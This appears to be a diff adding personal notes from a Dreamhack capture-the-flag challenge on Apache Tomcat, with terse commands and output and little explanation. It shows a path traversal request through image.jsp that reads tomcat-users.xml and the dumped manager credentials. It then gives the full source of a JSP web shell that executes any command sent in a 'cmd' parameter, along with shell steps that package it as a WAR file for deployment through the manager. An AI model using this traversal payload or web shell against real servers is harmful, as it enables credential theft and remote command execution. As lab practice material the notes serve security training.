@@ -1,0 +1,49 @@
+http://host3.dreamhack.games:18166/image.jsp?file=../../../../../../../usr/local/tomcat/conf/tomcat-users.xml
+===============================================================
+(base) bang3kyu@DESKTOP-UB7JF3T:~/web/Tomcat_Manager$ curl -s "http://host3.dreamhack.games:8375/image.jsp?file=../../../../../../../usr/local/tomcat/conf/tomcat-users.xml" \
+  -o result.txt
+
+cat result.txt
+===============================================================
+<?xml version="1.0" encoding="UTF-8"?>
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+
+    <role rolename="manager-gui"/>
+    <role rolename="manager-script"/>
+    <role rolename="manager-jmx"/>
+    <role rolename="manager-status"/>
+    <role rolename="admin-gui"/>
+    <role rolename="admin-script"/>
+    <user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
+
+===============================================================
+웹셸 참고 링크 : https://hacktricks.wiki/ko/network-services-pentesting/pentesting-web/tomcat/index.html
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+String output = "";
+if(cmd != null) {
+String s = null;
+try {
+Process p = Runtime.getRuntime().exec(cmd,null,null);
+BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+while((s = sI.readLine()) != null) { output += s+"</br>"; }
+}  catch(IOException e) {   e.printStackTrace();   }
+}
+%>
+<pre><%=output %></pre>
+===============================================================
+(base) bang3kyu@DESKTOP-UB7JF3T:~/web/Tomcat_Manager$ vi a.jsp
+(base) bang3kyu@DESKTOP-UB7JF3T:~/web/Tomcat_Manager$ jar -cvf a.war .
+added manifest
+adding: a.jsp(in = 523) (out= 338)(deflated 35%)
+adding: result.txt(in = 659) (out= 275)(deflated 58%)
+
